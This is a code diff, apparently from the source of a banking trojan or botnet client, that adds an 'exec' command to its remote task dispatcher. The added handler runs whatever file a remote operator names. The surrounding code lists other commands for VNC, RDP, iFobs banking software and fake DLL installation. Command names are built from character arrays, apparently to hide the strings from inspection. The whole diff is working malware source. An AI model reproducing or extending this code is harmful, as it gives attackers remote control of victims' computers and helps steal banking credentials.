@@ -1108,6 +1108,21 @@ bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+bool ExecuteExec(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+	if( RunFileA(Args) )
+	{
+		TASKDBG( "Exec", "true" );
+		return true;
+	}
+	else
+	{
+		int err = pGetLastError();
+		TASKDBG( "Exec", "error %d", err );
+		return false;
+	}
+}
+
 /*
 
 // Тело потока команды installfakedll
@@ -1227,8 +1242,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandVNC[]			 = {'v','n', 'c', 0};
 	const static char CommandIFobs[]		 = {'i','f', 'o', 'b', 's', 0};
 	const static char CommandLF[]			 = {'l','f',0};
+	const static char CommandExec[]			 = {'e','x','e','c',0};
 
-	int Index = StrIndexOf( Command, false, 13,
+	int Index = StrIndexOf( Command, false, 14,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1241,7 +1257,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandRDP,
 							(PCHAR)CommandVNC,
 							(PCHAR)CommandIFobs,
-							(PCHAR)CommandLF
+							(PCHAR)CommandLF,
+							(PCHAR)CommandExec
 						  );
 
 
@@ -1260,6 +1277,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 10: return ExecuteVNC;
 		case 11: return ExecuteIFobs;
 		case 12: return ExecuteLF;
+		case 13: return ExecuteExec;
 
     default: ;
 	}
